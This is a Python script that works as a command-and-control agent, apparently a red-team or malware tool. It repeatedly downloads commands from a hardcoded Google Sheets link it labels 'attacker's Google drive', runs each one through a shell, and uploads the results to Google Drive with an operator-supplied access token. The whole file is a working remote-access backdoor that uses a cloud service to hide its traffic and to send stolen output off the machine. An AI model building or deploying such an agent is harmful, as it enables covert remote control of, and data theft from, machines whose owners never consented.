import os
import time
import gdown
import subprocess
import sys
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload, MediaIoBaseDownload
from httplib2 import Http
from oauth2client import file, client, tools


# 權限必須
SCOPES = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']


def delete_drive_service_file(service, file_id):
    service.files().delete(fileId=file_id).execute()


def update_file(service, update_drive_service_name, local_file_path):
    """
    將本地端的檔案傳到雲端上
    :param service: 認證用
    :param update_drive_service_name: 存到 雲端上的名稱
    :param local_file_path: 本地端的位置
    :param local_file_name: 本地端的檔案名稱
    """

    # print("正在上傳檔案...")
    file_metadata = {'name': update_drive_service_name}
    media = MediaFileUpload(local_file_path, )
    file_metadata_size = media.size()
    start = time.time()
    file_id = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
    end = time.time()
    # print("上傳檔案成功！")
    # print('雲端檔案名稱為: ' + str(file_metadata['name']))
    # print('雲端檔案ID為: ' + str(file_id['id']))
    # print('檔案大小為: ' + str(file_metadata_size) + ' byte')
    # print("上傳時間為: " + str(end-start))

    return file_metadata['name'], file_id['id']

 
def search_file(service, update_drive_service_name, is_delete_search_file=False):
    """
    本地端
    取得到雲端名稱，可透過下載時，取得file id 下載
    :param service: 認證用
    :param update_drive_service_name: 要上傳到雲端的名稱
    :param is_delete_search_file: 判斷是否需要刪除這個檔案名稱
    """

    # Call the Drive v3 API
    results = service.files().list(fields="nextPageToken, files(id, name)", spaces='drive',
                                   q="name = '" + update_drive_service_name + "' and trashed = false").execute()

    items = results.get('files', [])
    if not items:
        # print('沒有發現你要找尋的 ' + update_drive_service_name + ' 檔案.')
        pass
    else:
        # print('搜尋的檔案: ')
        for item in items:
            times = 1
            # print(u'{0} ({1})'.format(item['name'], item['id']))
            if is_delete_search_file is True:
                # print("刪除檔案為:" + u'{0} ({1})'.format(item['name'], item['id']))
                delete_drive_service_file(service, file_id=item['id'])

            if times == len(items):
                return item['id']
            else:
                times += 1


def trashed_file(service, is_delete_trashed_file=False):
    """
    抓取到雲端上垃圾桶內的全部檔案，進行刪除
    :param service: 認證用
    :param is_delete_trashed_file: 是否要刪除垃圾桶資料
    """

    results = service.files().list(fields="nextPageToken, files(id, name)", spaces='drive', q="trashed = true",
                                   ).execute()
    items = results.get('files', [])
    if not items:
        print('垃圾桶無任何資料.')
    else:
        print('垃圾桶檔案: ')

        for item in items:
            print(u'{0} ({1})'.format(item['name'], item['id']))
            if is_delete_trashed_file is True:
                print("刪除檔案為:" + u'{0} ({1})'.format(item['name'], item['id']))
                delete_drive_service_file(service, file_id=item['id'])

 
def upload(is_update_file_function=False, update_drive_service_name=None, update_file_path=None, has_access_token=False, access_token=""):
    """
    :param is_update_file_function: 判斷是否執行上傳的功能
    :param update_drive_service_name: 要上傳到雲端上的檔案名稱
    :param update_file_path: 要上傳檔案的位置以及名稱
    """

    # print("is_update_file_function")
    # print(type(is_update_file_function))
    # print(is_update_file_function)

    creds = client.AccessTokenCredentials(access_token, '')
    service = build('drive', 'v3', http=creds.authorize(Http()), static_discovery=False)
    # print('*' * 10)

    if is_update_file_function is True:
        # print(update_file_path + update_drive_service_name)
        # print("=====執行上傳檔案=====")

        # 清空 雲端垃圾桶檔案
        # trashed_file(service=service, is_delete_trashed_file=True)

        # 搜尋要上傳的檔案名稱是否有在雲端上並且刪除
        search_file(service=service, update_drive_service_name=update_drive_service_name, is_delete_search_file=True)

        # 檔案上傳到雲端上
        update_file(service=service, update_drive_service_name=update_drive_service_name, local_file_path=os.getcwd() + '/' + update_drive_service_name)

        # print("=====上傳檔案完成=====")

 
if __name__ == '__main__':
    oldCommands = []
    interval = 5
    access_token = ""
    dieFlag = 0
    while True:
        print("[*] Awaking ...")
        # fetch commands
        print("[*] Fetching commands from attacker's Google drive ...")

        # change to your link of sheet file in csv format
        # url = {file_link}/{file_id}/export?format=csv&id={file_id}
        url = 'https://docs.google.com/spreadsheets/u/3/d/1I1SnnDLVnBZJW0BVRy-jE3m5NlX3OvcCu49kIJ9mquQ/export?format=csv&id=1I1SnnDLVnBZJW0BVRy-jE3m5NlX3OvcCu49kIJ9mquQ&gid=0'
        output = 'commands'
        gdown.download(url, output, quiet=True)
        
        commands = []
        with open('commands') as f:
            for line in f.readlines():
                commands.append(line.strip())
        # print(commands)

        # avoid same upload operations
        if commands == oldCommands:
            print(f"[*] Same commands received. Going to sleep for {interval} second ...")
            continue
        else: oldCommands = commands

        with open('outputs.txt', 'w') as f:
            for command in commands:
                f.write(f'\n> {command}\n')
                if command == 'die':
                    dieFlag = 1
                    print("[*] Ready to die ...") 
                    f.write(f'Agent is dead.\n')
                    break
                elif 'sleep ' in command:
                    interval = int(command[6:])
                    print(f"[*] Setting sleep interval to {interval} second ...")
                    f.write(f"Sleep interval was set to {interval} second.\n")
                elif 'token ' in command:
                    access_token = command[6:]
                    print(f"[*] Setting access token to \"{access_token}\" ...")
                    f.write(f"Access token was set to \"{access_token}\".\n")
                else:
                    print(f"[*] Executing \"{command}\" ...")
                    pipe = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    res = pipe.communicate()
                    if res[1]: f.write(res[1].decode())
                    else: f.write(res[0].decode())

        try:
            print(f"[*] Uploading output.txt ...")
            upload(is_update_file_function=bool(True), update_drive_service_name='outputs.txt', update_file_path=os.getcwd() + '/', access_token=access_token)
        except:
            print("[*] Invalid access token ...")

        if dieFlag: 
            print("[*] Dying ...")
            sys.exit()

        print(f"[*] Going to sleep for {interval} second ...")
        time.sleep(interval)
        